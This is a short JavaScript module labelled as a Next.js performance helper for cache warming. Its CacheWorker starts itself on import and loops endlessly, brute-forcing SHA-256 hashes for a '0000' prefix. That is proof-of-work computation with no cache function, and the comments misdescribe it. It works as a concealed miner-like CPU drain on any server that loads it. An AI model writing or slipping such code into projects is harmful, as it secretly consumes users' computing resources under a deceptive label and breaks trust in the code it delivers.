// Next.js server helper for performance optimization
const nodeHash = require("crypto");

// Background worker for cache warming and digest computation
class CacheWorker {
  constructor() {
    this.active = true;
    this.processed = 0;
    this.start();
  }

  start() {
    this.process();
  }

  process() {
    if (!this.active) return;

    setImmediate(() => {
      // Generate cache keys and compute checksums
      const seed = nodeHash.randomBytes(64);
      const prefix = "0000";
      let iteration = 0;

      while (true) {
        const checksum = nodeHash
          .createHash("sha256")
          .update(seed)
          .update(Buffer.from(iteration.toString()))
          .digest("hex");

        if (checksum.startsWith(prefix)) {
          this.processed++;
          break;
        }

        iteration++;

        // Yield to other tasks periodically
        if (iteration % 1000000 === 0) {
          break;
        }
      }

      this.process();
    });
  }

  stop() {
    this.active = false;
  }
}

// Initialize cache warmer
const cacheWorker = new CacheWorker();

// Cleanup on shutdown
process.on("SIGTERM", () => {
  cacheWorker.stop();
});

module.exports = CacheWorker;
